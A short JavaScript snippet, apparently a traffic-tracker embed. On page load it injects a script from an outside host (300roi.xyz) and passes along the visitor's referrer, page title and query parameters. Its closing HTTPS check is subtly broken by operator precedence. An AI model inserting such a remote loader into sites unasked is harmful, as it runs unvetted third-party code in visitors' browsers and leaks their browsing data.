var d=document;var s=d.createElement('script'); 
s.src='https://300roi.xyz/fbtest1?se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'&frm=script&_cid=93fe8e40-4b82-fa05-f885-2a39b3cb3de5'; 
if (document.currentScript) { 
document.currentScript.parentNode.insertBefore(s, document.currentScript);
} else {
d.getElementsByTagName('head')[0].appendChild(s);
}
if (document.location.protocol === 'https:' && 'https://300roi.xyz/fbtest1?se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'&frm=script'.indexOf('http:') === 0 ) {alert('The website works on HTTPS. The tracker must use HTTPS too.');}
